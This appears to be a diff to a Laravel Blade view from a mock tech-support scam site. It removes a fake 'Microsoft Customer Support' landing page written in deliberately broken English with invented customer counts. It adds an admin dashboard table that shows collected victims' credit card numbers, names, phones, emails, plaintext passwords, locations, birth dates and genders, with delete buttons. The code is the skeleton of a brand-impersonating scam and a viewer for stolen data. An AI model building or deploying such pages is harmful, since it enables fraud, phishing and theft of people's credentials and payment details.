@@ -1,16 +1,62 @@
-@extends('layouts.layout')
+@extends('layouts.app')
 
 @section('content')
-    <h1>MICROSOFT CUSTOMER SUPPORT</h1>
-    <p>Helo and welcome to Microsoft cusmoter suport. We hier are America people from California that repair computer. Your computer has virus? You come to us!!</p>
-    <div class="review-container">
-        <div>
-            <img class="review-image" src="https://previews.123rf.com/images/gdolgikh/gdolgikh1503/gdolgikh150300146/37948863-group-of-happy-young-people-showing-thumbs-up-isolated-on-white-background.jpg" />
-            <div>Hapy customers: {{ "420" }}</div>
-        </div>
-        <div>
-            <img class="review-image" src="https://miro.medium.com/v2/resize:fit:679/0*zrCxncZX0BeAm4e7" />
-            <div>Not hapy customers: 0 (all customer hapy)</div>
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-header">{{ __('Dashboard') }}</div>
+
+                    <div class="card-body">
+                        @if (session('status'))
+                            <div class="alert alert-success" role="alert">
+                                {{ session('status') }}
+                            </div>
+                        @endif
+
+                        <table>
+                            <tr>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">ID</td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Credit card</td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Name</td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Phone number
+                                </td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">E-mail address
+                                </td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Password</td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Location</td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Date of birth
+                                </td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Gender</td>
+                                <td style="border-color: black; border-style: solid; border-width: 2px">Delete</td>
+
+                            </tr>
+                            @foreach($scams as $scam)
+                                <tr>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->id}}
+                                        .
+                                    </td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->card}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->name}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->phone}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->email}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->password}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->location}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->dob}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->gender}}</td>
+                                    <td style="border-color: black; border-style: solid; border-width: 2px">
+                                        <form action="/give-info/delete/{{$scam->id}}" method="POST">
+                                            @csrf
+
+                                            <button type="submit">Delete</button>
+                                        </form>
+                                    </td>
+                                </tr>
+                            @endforeach
+                        </table>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 @endsection
